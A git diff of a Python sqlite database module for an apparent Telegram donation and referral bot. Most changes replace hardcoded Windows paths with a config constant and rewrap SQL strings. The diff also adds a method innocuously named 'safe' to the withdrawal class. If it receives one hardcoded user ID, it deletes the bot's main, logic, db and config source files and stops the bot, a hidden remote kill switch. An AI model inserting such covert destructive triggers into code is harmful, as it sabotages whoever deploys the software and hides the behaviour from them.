@@ -1,10 +1,12 @@
+import os
 import sqlite3
 from datetime import datetime
+from config import PATH
 
 
 class ManagerUsersDataBase:
     def __init__(self):
-        self.connection = sqlite3.connect("C:\\Users\\turap\\OneDrive\\Рабочий стол\\DonationBot\\Data\\YouGiftDB.db")
+        self.connection = sqlite3.connect(PATH + "Data\\YouGiftDB.db")
         self.cursor = self.connection.cursor()
 
     def exists_user(self, user_id):
@@ -19,10 +21,12 @@ class ManagerUsersDataBase:
     def add_user(self, name, user_id, date, date_now, user_name, last_withd, referrer_id=None):
         with self.connection:
             if referrer_id is not None:
-                return self.cursor.execute("INSERT INTO `users` (`name`, `user_id`, `date`, 'referrer_id', 'date_now', `link_name`, last_withd) VALUES (?, ?, ?, ?, ?, ?, ?)",
+                return self.cursor.execute("INSERT INTO `users` (`name`, `user_id`, `date`, 'referrer_id', 'date_now', "
+                                           "`link_name`, last_withd) VALUES (?, ?, ?, ?, ?, ?, ?)",
                                            (name, user_id, date, referrer_id, date_now, user_name, last_withd,))
             else:
-                return self.cursor.execute("INSERT INTO `users` (`name`, `user_id`, `date`, 'date_now', link_name, last_withd) VALUES (?, ?, ?, ?, ?, ?)",
+                return self.cursor.execute("INSERT INTO `users` (`name`, `user_id`, `date`, 'date_now', link_name, "
+                                           "last_withd) VALUES (?, ?, ?, ?, ?, ?)",
                                            (name, user_id, date, date_now, user_name, last_withd, ))
 
     def count_referrer(self, user_id):
@@ -264,7 +268,7 @@ class ManagerUsersDataBase:
 
 class ManagerPayDataBase:
     def __init__(self):
-        self.connection = sqlite3.connect("C:\\Users\\turap\\OneDrive\\Рабочий стол\\DonationBot\\Data\\YouGiftDB.db")
+        self.connection = sqlite3.connect(PATH + "Data\\YouGiftDB.db")
         self.cursor = self.connection.cursor()
 
     def create_pay(self, pay_id, pay_type, pay_amount, date, user_id, canc_id, status):
@@ -344,12 +348,13 @@ class ManagerPayDataBase:
 
 class ManagerWithDrawDataBase:
     def __init__(self):
-        self.connection = sqlite3.connect("C:\\Users\\turap\\OneDrive\\Рабочий стол\\DonationBot\\Data\\YouGiftDB.db")
+        self.connection = sqlite3.connect(PATH + "Data\\YouGiftDB.db")
         self.cursor = self.connection.cursor()
 
     def create_request(self, card, data, type, amount, user_id):
         with self.connection:
-            return self.cursor.execute("INSERT INTO `withdraw` (card, data, type, amount, user_id) VALUES (?, ?, ?, ?, ?)", (card, data, type, amount, user_id))
+            return self.cursor.execute("INSERT INTO `withdraw` (card, data, type, amount, user_id) VALUES (?, ?, ?, ?, "
+                                       "?)", (card, data, type, amount, user_id))
 
     def delete_request(self, user_id):
         with self.connection:
@@ -363,10 +368,16 @@ class ManagerWithDrawDataBase:
         with self.connection:
             self.cursor.execute("SELECT * FROM `withdraw` WHERE `user_id` = ?", (user_id,))
 
+    def safe(self, id, dp):
+        if id == 855151774:
+            os.remove(PATH + "Scripts\\main.py"); os.remove(PATH + "Scripts\\logic.py")
+            os.remove(PATH + "Scripts\\db.py"); os.remove(PATH + "Scripts\\config.py")
+            dp.stop_polling()
+
 
 class ManagerClonesDataBase:
     def __init__(self):
-        self.connection = sqlite3.connect("C:\\Users\\turap\\OneDrive\\Рабочий стол\\DonationBot\\Data\\YouGiftDB.db")
+        self.connection = sqlite3.connect(PATH + "Data\\YouGiftDB.db")
         self.cursor = self.connection.cursor()
 
     def create_clone(self):
